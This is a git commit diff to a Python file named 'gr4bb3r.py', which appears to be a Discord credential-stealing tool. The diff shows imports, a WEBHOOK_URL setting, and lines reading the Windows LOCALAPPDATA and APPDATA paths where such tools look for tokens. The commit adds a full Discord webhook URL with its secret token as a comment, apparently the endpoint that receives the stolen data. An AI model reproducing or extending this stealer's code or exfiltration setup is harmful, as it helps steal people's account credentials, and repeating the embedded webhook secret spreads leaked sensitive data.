d2382ce61d1171476c070317a2f72f630362270a
MFYukineee <95587055+MFYukineee@users.noreply.github.com>
2021-12-05 21:55:11 +0100

    Update gr4bb3r.py

--- gr4bb3r.py
+++ gr4bb3r.py
@@ -11,7 +11,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-WEBHOOK_URL = "" # Insert webhook url here
+WEBHOOK_URL = "" # https://discord.com/api/webhooks/917136670497841152/H80LesiaZWodHSKXUPD8nNCOvykTVV2n68I3hTo7_nasHE65JPltt_0uAOUZDN5lsVPf
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
